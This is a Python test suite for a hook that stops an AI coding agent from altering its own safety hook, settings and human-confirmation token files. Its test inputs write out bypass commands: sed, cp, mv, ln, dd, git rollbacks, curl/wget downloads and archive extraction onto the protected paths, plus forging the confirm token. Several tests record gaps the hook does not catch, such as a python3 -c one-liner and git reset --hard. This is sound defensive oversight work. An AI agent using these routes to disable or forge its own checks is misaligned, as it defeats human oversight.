"""S6 (Phase-S Tier-2): hook tamper-resistance -- bash file-writes and
Edit/Write/NotebookEdit tool calls targeting scope_gate_hook.py or the
files it depends on to enforce S1-S5 must be blocked unless a human has
run scripts/confirm-hook-edit.sh within the last ~30 minutes (see
mcp-servers/hook_confirm.py's own module docstring for why).

Mirrors tests/test_scope_gate_hook.py's own conventions (_run_main via
monkeypatched sys.stdin, the _isolated_active_engagement autouse fixture)
so this file behaves identically under pytest regardless of what engagement
is really active on this machine.
"""

import io
import json
import os

import engagement_paths
import hook_confirm
import pytest
import rce_confirm
import scope_gate_hook as hook

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


@pytest.fixture(autouse=True)
def _isolated_state(monkeypatch, tmp_path):
    """Same isolation rationale as test_scope_gate_hook.py's own fixture,
    plus isolating the two confirm-token paths so a real, valid token
    left on this machine's disk (or a real active engagement) never
    leaks into these tests."""
    monkeypatch.setattr(engagement_paths, "ACTIVE_POINTER", str(tmp_path / ".not-really-active"))
    monkeypatch.setenv("HUNTMCP_HOOK_CONFIRM_PATH", str(tmp_path / "hook-edit-confirm.json"))
    monkeypatch.setenv("HUNTMCP_RCE_CONFIRM_PATH", str(tmp_path / "os-shell-confirm.json"))
    monkeypatch.setenv("HUNTMCP_AUDIT_LOG", str(tmp_path / "audit.jsonl"))
    # No engagement.yaml in tmp_path -- must never pick up this machine's
    # REAL active engagement (e.g. an in-flight hunt), which would make a
    # write-detection test pass/fail for the wrong reason (an unrelated
    # out-of-scope-host block) instead of testing tamper-resistance itself.
    monkeypatch.chdir(tmp_path)


def _run_main(monkeypatch, payload):
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(payload)))
    return hook.main()


def _confirm(monkeypatch, ttl_seconds=1800):
    hook_confirm.request_confirmation(
        ttl_seconds=ttl_seconds,
        stdin=_FakeTTY(hook_confirm.CONFIRM_PHRASE + "\n"),
        stdout=io.StringIO(),
    )


class _FakeTTY(io.StringIO):
    def isatty(self):
        return True


# ---- Edit/Write/NotebookEdit blocking ----------------------------------

def test_main_blocks_edit_of_scope_gate_hook_itself(monkeypatch):
    payload = {"tool_name": "Edit", "tool_input": {
        "file_path": "scripts/hooks/scope_gate_hook.py",
        "old_string": "x", "new_string": "y",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_write_of_claude_settings_json(monkeypatch):
    payload = {"tool_name": "Write", "tool_input": {
        "file_path": os.path.join(REPO_ROOT, ".claude", "settings.json"),
        "content": "{}",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_write_of_settings_local_json(monkeypatch):
    payload = {"tool_name": "Write", "tool_input": {
        "file_path": os.path.join(REPO_ROOT, ".claude", "settings.local.json"),
        "content": "{}",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_edit_of_opencode_dispatch_plugin(monkeypatch):
    payload = {"tool_name": "Edit", "tool_input": {
        "file_path": ".opencode/plugin/scope-gate.ts",
        "old_string": "x", "new_string": "y",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_edit_of_opencode_jsonc(monkeypatch):
    payload = {"tool_name": "Edit", "tool_input": {
        "file_path": "opencode.jsonc",
        "old_string": "x", "new_string": "y",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_edit_of_a_dependency_module(monkeypatch):
    for rel in (
        "mcp-servers/scope_guard.py", "mcp-servers/budget_guard.py",
        "mcp-servers/audit_log.py", "mcp-servers/rce_confirm.py",
        "mcp-servers/sandbox_runner.py", "mcp-servers/dotenv_loader.py",
        "mcp-servers/hook_confirm.py",
    ):
        payload = {"tool_name": "Edit", "tool_input": {
            "file_path": rel, "old_string": "x", "new_string": "y",
        }}
        assert _run_main(monkeypatch, payload) == 2, f"{rel} should be protected"


def test_main_blocks_edit_via_relative_traversal(monkeypatch):
    """../ tricks must not evade resolution -- the path still resolves to
    the same real protected file."""
    payload = {"tool_name": "Edit", "tool_input": {
        "file_path": "scripts/hooks/../hooks/scope_gate_hook.py",
        "old_string": "x", "new_string": "y",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_notebookedit_of_protected_path(monkeypatch):
    """NotebookEdit uses notebook_path, not file_path."""
    payload = {"tool_name": "NotebookEdit", "tool_input": {
        "notebook_path": os.path.join(REPO_ROOT, ".claude", "settings.json"),
        "new_source": "x",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_allows_edit_of_an_unrelated_file(monkeypatch):
    payload = {"tool_name": "Edit", "tool_input": {
        "file_path": "mcp-servers/nuclei-mcp/server.py",
        "old_string": "x", "new_string": "y",
    }}
    assert _run_main(monkeypatch, payload) == 0


def test_main_allows_read_of_a_protected_path(monkeypatch):
    """Read must never be gated by this -- reading the hook's own source
    for review is ordinary, unrestricted development, not a tamper."""
    payload = {"tool_name": "Read", "tool_input": {
        "file_path": "scripts/hooks/scope_gate_hook.py",
    }}
    assert _run_main(monkeypatch, payload) == 0


def test_main_allows_protected_edit_with_a_valid_confirm_token(monkeypatch):
    _confirm(monkeypatch)
    payload = {"tool_name": "Edit", "tool_input": {
        "file_path": "scripts/hooks/scope_gate_hook.py",
        "old_string": "x", "new_string": "y",
    }}
    assert _run_main(monkeypatch, payload) == 0


def test_main_blocks_protected_edit_with_an_expired_confirm_token(monkeypatch):
    _confirm(monkeypatch, ttl_seconds=-1)
    payload = {"tool_name": "Edit", "tool_input": {
        "file_path": "scripts/hooks/scope_gate_hook.py",
        "old_string": "x", "new_string": "y",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_allows_multiple_protected_edits_on_one_confirm(monkeypatch):
    """Core multi-use behavior: one human confirm covers a whole
    maintenance session's worth of edits, not just one."""
    _confirm(monkeypatch)
    payload = {"tool_name": "Edit", "tool_input": {
        "file_path": "scripts/hooks/scope_gate_hook.py",
        "old_string": "x", "new_string": "y",
    }}
    assert _run_main(monkeypatch, payload) == 0
    assert _run_main(monkeypatch, payload) == 0
    assert _run_main(monkeypatch, payload) == 0


def test_main_blocks_edit_through_a_symlink_that_resolves_to_a_protected_path(monkeypatch, tmp_path):
    """A symlink at an unprotected-looking path that resolves to the real
    protected file must not evade detection."""
    real_hook = os.path.join(REPO_ROOT, "scripts", "hooks", "scope_gate_hook.py")
    link = tmp_path / "totally-not-the-hook.py"
    link.symlink_to(real_hook)
    payload = {"tool_name": "Edit", "tool_input": {
        "file_path": str(link), "old_string": "x", "new_string": "y",
    }}
    assert _run_main(monkeypatch, payload) == 2


# ---- Bash write detection -----------------------------------------------

def test_main_blocks_bash_redirect_to_the_hook(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "echo 'x' > scripts/hooks/scope_gate_hook.py",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_bash_append_redirect_to_settings_json(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "echo '{}' >> .claude/settings.json",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_bash_redirect_with_no_space_before_path(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "echo x >scripts/hooks/scope_gate_hook.py",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_sed_in_place_on_the_hook(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "sed -i 's/return 0/return 2/' scripts/hooks/scope_gate_hook.py",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_tee_to_the_hook(monkeypatch):
    # Deliberately not curl/wget/etc as the pipe source -- this must be
    # caught by the NEW protected-path write check, not by incidentally
    # tripping the pre-existing Tier-2 out-of-scope-host check.
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "cat /tmp/malicious.py | tee scripts/hooks/scope_gate_hook.py",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_cp_with_protected_destination(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "cp /tmp/malicious.py scripts/hooks/scope_gate_hook.py",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_allows_cp_with_protected_source_only(monkeypatch):
    """Copying the hook file elsewhere is a READ, not a tamper -- must not
    be blocked (same principle as `cat`ing the file for review)."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "cp scripts/hooks/scope_gate_hook.py /tmp/review-copy.py",
    }}
    assert _run_main(monkeypatch, payload) == 0


# ---- directory-destination bypass (security-review finding, confirmed) ----
#
# Real cp/mv/install/rsync/ln and git checkout/restore all accept an
# existing DIRECTORY as their destination -- the file lands INSIDE it
# (using the source's own basename for cp/mv/install/rsync/ln; the whole
# subtree for git checkout/restore), not at the literal directory path
# typed on the command line. A check that only matches the literal
# destination argument against the exact protected-file set never catches
# this: `cp /tmp/x scripts/hooks/` writes to scripts/hooks/scope_gate_hook.py
# on disk, but "scripts/hooks/" (the directory) was never itself a member
# of the protected set. Found and confirmed exploitable via an independent
# security-review pass on S6 itself (two parallel verification sub-agents,
# 8/10 confidence each) before this branch was reported complete -- see
# both the hook-file bypass and its more serious sibling, forging
# hook_confirm.py's OWN token file the identical way (`cp forged.json
# data/`), which would let an agent grant itself "confirmed" status with
# zero human ever running scripts/confirm-hook-edit.sh.

def test_main_blocks_cp_with_protected_directory_destination(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "cp /tmp/malicious.py scripts/hooks/",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_cp_with_protected_directory_destination_no_trailing_slash(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "cp /tmp/malicious.py scripts/hooks",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_cp_forging_the_confirm_token_via_directory_destination(monkeypatch, tmp_path):
    """The more serious sibling: forging hook_confirm.py's own token file
    the same directory-destination way would let an agent grant itself an
    indefinitely 'confirmed' state with zero human ever running the real
    confirm script. Targets the isolation fixture's own configured token
    directory directly (an absolute path, so _resolve_maybe_relative uses
    it as-is rather than anchoring to _REPO_ROOT) -- NOT the real repo's
    data/ dir: doing this against the real default token location would
    entangle the test with whatever confirm state genuinely exists on the
    machine running the suite (e.g. a maintainer's own currently-valid
    confirm window), which would make the test pass or fail for the wrong
    reason depending on unrelated, real, time-sensitive machine state. No
    file is ever actually written by this test -- _run_main only calls
    the hook's own allow/block decision function, never executes the
    simulated Bash command."""
    token_dir = str(tmp_path) + "/"
    payload = {"tool_name": "Bash", "tool_input": {
        "command": f"cp /tmp/forged-token.json {token_dir}",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_mv_with_protected_directory_destination(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "mv /tmp/malicious.py mcp-servers/",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_install_with_protected_directory_destination(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "install -m 644 /tmp/malicious.py scripts/hooks/",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_ln_symlinking_into_a_protected_directory(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "ln -sf /tmp/malicious.py scripts/hooks/",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_git_checkout_of_a_protected_directory(monkeypatch):
    """git checkout on a directory pathspec restores the WHOLE subtree
    from history -- a distinct bypass shape from a single-file checkout,
    since the directory itself is never the protected path's own literal
    text."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "git checkout HEAD~1 -- scripts/hooks/",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_git_restore_of_a_protected_directory(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "git restore mcp-servers/",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_allows_cp_to_an_unrelated_existing_directory(monkeypatch):
    """Negative control: a directory that contains no protected path must
    stay allowed -- this is an ancestry check against the real protected
    FILE set, not a blanket block on writing into any existing directory."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "cp /tmp/notes.txt mcp-servers/writeup-mcp/",
    }}
    assert _run_main(monkeypatch, payload) == 0


def test_main_blocks_mv_with_protected_source(monkeypatch):
    """Moving the hook file away makes it vanish from where it's
    registered -- a real tamper even though the destination isn't
    itself a protected path."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "mv scripts/hooks/scope_gate_hook.py /tmp/gone.py",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_install_with_protected_destination(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "install -m 644 /tmp/malicious.py scripts/hooks/scope_gate_hook.py",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_ln_symlinking_over_the_hook(monkeypatch):
    """ln -sf replaces the protected path's own dirent with a symlink to
    attacker content -- same 'last positional arg is the destination'
    shape as cp/install/rsync above."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "ln -sf /tmp/malicious.py scripts/hooks/scope_gate_hook.py",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_dd_with_protected_of_target(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "dd if=/tmp/malicious.py of=scripts/hooks/scope_gate_hook.py",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_git_checkout_of_protected_path(monkeypatch):
    """git checkout overwrites the working tree from a historical commit
    WITHOUT going through any shell redirect -- a distinct bypass from the
    redirect/cp/sed cases above. If an older, pre-S6 commit exists with an
    unprotected hook, this would silently roll it back."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "git checkout HEAD~1 -- scripts/hooks/scope_gate_hook.py",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_git_restore_of_protected_path(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "git restore scripts/hooks/scope_gate_hook.py",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_git_restore_with_source_of_protected_path(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "git restore --source=HEAD~1 scripts/hooks/scope_gate_hook.py",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_allows_ordinary_git_checkout_of_a_branch(monkeypatch):
    """A bare `git checkout <ref>` with no `--` is ambiguous (could be a
    branch/tag name, not a path) -- only the explicit `-- <path>` form is
    trusted, to avoid false-positive-blocking ordinary branch switches."""
    payload = {"tool_name": "Bash", "tool_input": {"command": "git checkout main"}}
    assert _run_main(monkeypatch, payload) == 0


def test_main_allows_git_checkout_of_an_unrelated_path(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "git checkout HEAD~1 -- README.md",
    }}
    assert _run_main(monkeypatch, payload) == 0


def test_main_blocks_chained_smuggled_write(monkeypatch):
    """Same smuggling shape the rm-block already guards against -- a
    protected write hidden as the second half of a chained command."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "git status && echo x > scripts/hooks/scope_gate_hook.py",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_allows_unrelated_bash_command(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {"command": "git status"}}
    assert _run_main(monkeypatch, payload) == 0


def test_main_allows_redirect_to_an_unrelated_file(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {"command": "echo hi > /tmp/scratch-notes.txt"}}
    assert _run_main(monkeypatch, payload) == 0


def test_main_allows_bash_write_with_a_valid_confirm_token(monkeypatch):
    _confirm(monkeypatch)
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "echo 'x' > scripts/hooks/scope_gate_hook.py",
    }}
    assert _run_main(monkeypatch, payload) == 0


def test_main_does_not_claim_to_catch_an_obscured_python_one_liner(monkeypatch):
    """HONEST LIMIT, matching the rm-block/.env-block's own acknowledged
    gap: this is a cheap word/arg scan, not a shell/interpreter parser.
    A write smuggled inside a python3 -c string is NOT caught -- asserted
    here explicitly so this gap stays documented and visible instead of
    silently assumed closed."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "python3 -c \"open('scripts/hooks/scope_gate_hook.py','w').write('x')\"",
    }}
    assert _run_main(monkeypatch, payload) == 0


def test_main_does_not_claim_to_catch_zip_slip_into_an_unrelated_directory(monkeypatch):
    """HONEST LIMIT (round 2): an archive member whose OWN name contains
    ../ traversal, extracted into an unrelated (non-ancestor) directory,
    is NOT caught -- this only checks the stated destination directory
    argument, not each archive member's own name. Asserted explicitly so
    this stays documented and visible rather than silently assumed
    closed by the tar/unzip/7z destination-directory checks above."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "tar -xf /tmp/evil-zipslip.tar -C /tmp/scratch/",
    }}
    assert _run_main(monkeypatch, payload) == 0


def test_main_does_not_claim_to_catch_bare_git_checkout_of_a_ref(monkeypatch):
    """ACCEPTED RESIDUAL GAP (Vuln 5, security-review round 2) -- human
    decision: document and defer, do not implement a mitigation in this
    patch. `git checkout <ref>` with no path/`--` carries no destination
    argument for _protected_hit() to inspect at all; it can silently
    revert scope_gate_hook.py and its dependencies to an old,
    unprotected state (a real, pre-S1 commit exists in this repo's own
    history). Asserted explicitly, same honesty standard as the python3
    one-liner and zip-slip gaps above, so this stays documented and
    visible rather than silently assumed closed. See
    IMPLEMENTATION-TASK-TRACKER.md's S6 entry for the full writeup and
    the two mitigation options considered."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "git checkout 50736b2",
    }}
    assert _run_main(monkeypatch, payload) == 0


def test_main_does_not_claim_to_catch_git_reset_hard(monkeypatch):
    """ACCEPTED RESIDUAL GAP (Vuln 5) -- same reasoning as the bare
    checkout case above; `git reset --hard <ref>` also carries no
    destination argument and is not caught."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "git reset --hard 50736b2",
    }}
    assert _run_main(monkeypatch, payload) == 0


# ---- Dynamic confirm-token-path protection (closes rce_confirm.py's own
# documented "S6's job" gap: an agent forging os-shell-confirm.json or
# hook-edit-confirm.json directly, bypassing the interactive script) ------

def test_main_blocks_bash_write_to_the_current_rce_confirm_token_path(monkeypatch, tmp_path):
    token_path = str(tmp_path / "os-shell-confirm.json")
    monkeypatch.setenv("HUNTMCP_RCE_CONFIRM_PATH", token_path)
    payload = {"tool_name": "Bash", "tool_input": {
        "command": f"echo '{{}}' > {token_path}",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_write_to_the_current_hook_confirm_token_path(monkeypatch, tmp_path):
    token_path = str(tmp_path / "hook-edit-confirm.json")
    monkeypatch.setenv("HUNTMCP_HOOK_CONFIRM_PATH", token_path)
    payload = {"tool_name": "Write", "tool_input": {
        "file_path": token_path, "content": "{}",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_rce_confirm_token_forgery_even_via_edit(monkeypatch, tmp_path):
    """The exact bypass rce_confirm.py's own docstring names as an
    unclosed S4 limit ('an agent with Write/Edit access can fabricate a
    valid-looking token... skip request_confirmation() entirely') --
    must now be closed."""
    token_path = str(tmp_path / "os-shell-confirm.json")
    monkeypatch.setenv("HUNTMCP_RCE_CONFIRM_PATH", token_path)
    payload = {"tool_name": "Write", "tool_input": {
        "file_path": token_path,
        "content": json.dumps({"target": "vwfs.de", "expires_at": 9999999999, "consumed": False}),
    }}
    assert _run_main(monkeypatch, payload) == 2


# ---- curl/wget output-file bypass (security-review round 2, Vuln 3) ----
#
# curl/wget are already recognized Tier-2 tools elsewhere in this file
# (TIER2_BASH_TOOLS), but _writes_protected_path() never inspected their
# output-file flags -- curl -o/--output/-O and wget -O/--output-document
# can write attacker-controlled bytes to any local path, including a
# protected one, from an always-exempt dev-infra host (e.g.
# raw.githubusercontent.com), with zero confirm/block. Found via an
# independent security-review pass on S6 itself after the round-1 fix
# landed (confirmed 9/10 confidence).

def test_main_blocks_curl_o_with_protected_destination(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "curl -o scripts/hooks/scope_gate_hook.py https://example.com/x",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_curl_output_long_flag(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "curl --output scripts/hooks/scope_gate_hook.py https://example.com/x",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_curl_output_long_flag_with_equals(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "curl --output=scripts/hooks/scope_gate_hook.py https://example.com/x",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_curl_o_attached_form(monkeypatch):
    """curl's short -o accepts an attached (no-space) value, ordinary
    curl CLI usage -- must be matched the same as the spaced form."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "curl -oscripts/hooks/scope_gate_hook.py https://example.com/x",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_curl_remote_name_deriving_a_protected_filename(monkeypatch):
    """curl -O/--remote-name takes NO argument -- it derives the local
    filename from the URL's own last path segment, saved in the
    process's cwd (assumed repo-root, same honest limit
    _resolve_maybe_relative already documents for every relative
    Bash-write target). opencode.jsonc is the one protected path that's
    a bare repo-root filename, so it's the meaningful positive case for
    this specific derivation mechanism."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "curl -O https://example.com/opencode.jsonc",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_allows_curl_o_to_an_unrelated_file(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "curl -o /tmp/downloaded.html https://example.com/x",
    }}
    assert _run_main(monkeypatch, payload) == 0


def test_main_allows_plain_curl_with_no_output_flag(monkeypatch):
    """curl with no -o/-O prints to stdout -- no local-file write at
    all, must never be treated as a protected-path write."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "curl https://example.com/x",
    }}
    assert _run_main(monkeypatch, payload) == 0


def test_main_blocks_wget_O_with_protected_destination(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "wget -O scripts/hooks/scope_gate_hook.py https://example.com/x",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_wget_output_document_long_flag(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "wget --output-document=scripts/hooks/scope_gate_hook.py https://example.com/x",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_allows_wget_O_to_an_unrelated_file(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "wget -O /tmp/downloaded.html https://example.com/x",
    }}
    assert _run_main(monkeypatch, payload) == 0


# ---- archive-extraction bypass (security-review round 2, Vuln 4) -------
#
# tar/unzip/7z were entirely absent from _writes_protected_path() -- an
# extraction into an existing protected directory (same "directory
# destination" family the round-1 _protected_hit() fix closed for
# cp/mv/git, just a different command class never wired through it at
# all) was completely unmediated. Confirmed 8/10 confidence.
#
# ACKNOWLEDGED, NOT FIXED (same honesty as the python3-one-liner/
# git-apply-diff-body gaps): a "zip-slip" archive member whose own name
# contains ../ traversal, extracted into an UNRELATED (non-ancestor)
# destination directory, is NOT caught -- this only checks whether the
# stated destination directory argument is itself protected or an
# ancestor of a protected path, not each archive member's own name.

def test_main_blocks_tar_extraction_into_protected_directory(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "tar -xf /tmp/x.tar -C scripts/hooks/",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_blocks_tar_directory_long_flag_with_equals(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "tar -xf /tmp/x.tar --directory=scripts/hooks/",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_allows_tar_extraction_into_an_unrelated_directory(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "tar -xf /tmp/x.tar -C /tmp/scratch/",
    }}
    assert _run_main(monkeypatch, payload) == 0


def test_main_blocks_unzip_into_protected_directory(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "unzip /tmp/x.zip -d scripts/hooks/",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_allows_unzip_into_an_unrelated_directory(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "unzip /tmp/x.zip -d /tmp/scratch/",
    }}
    assert _run_main(monkeypatch, payload) == 0


def test_main_blocks_7z_extraction_into_protected_directory(monkeypatch):
    """7z's -o (extraction target directory) is ALWAYS the attached
    form -- no space is accepted between -o and the path, per 7-Zip's
    own CLI convention."""
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "7z x /tmp/x.7z -oscripts/hooks/",
    }}
    assert _run_main(monkeypatch, payload) == 2


def test_main_allows_7z_extraction_into_an_unrelated_directory(monkeypatch):
    payload = {"tool_name": "Bash", "tool_input": {
        "command": "7z x /tmp/x.7z -o/tmp/scratch/",
    }}
    assert _run_main(monkeypatch, payload) == 0
